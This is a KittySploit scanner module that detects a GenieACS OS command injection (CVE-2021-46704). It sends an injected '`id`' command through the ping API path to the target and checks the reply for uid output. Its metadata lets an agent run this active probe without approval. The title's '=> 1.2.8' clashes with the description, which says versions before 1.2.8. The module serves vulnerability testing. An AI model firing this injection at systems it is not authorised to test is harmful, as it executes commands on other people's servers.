#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In GenieACS 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GenieACS => 1.2.8 - OS Command Injection Detection',
        'description': 'In GenieACS 1.2.x before 1.2.8, the UI interface API is vulnerable to unauthenticated OS command injection via the ping host argument (lib/ui/api.ts and lib/ping.ts). The vulnerability arises from insufficient input validation combined with a missing authorization check.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'genieacs', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://twitter.com/shaybt12/status/1671598239835906058',
            'https://github.com/advisories/GHSA-2877-693q-pj33',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-46704',
            'https://github.com/genieacs/genieacs/commit/7f295beeecc1c1f14308a93c82413bb334045af6',
            'https://github.com/genieacs/genieacs/releases/tag/v1.2.8',
        ],
        'cve': 'CVE-2021-46704',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/ping/;`id`', allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/plain',)
        body_regexes = ('uid=([0-9]+)',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="GenieACS => 1.2.8 - OS Command Injection detected",
                path='/api/ping/;`id`',
            )
            return True
        return False

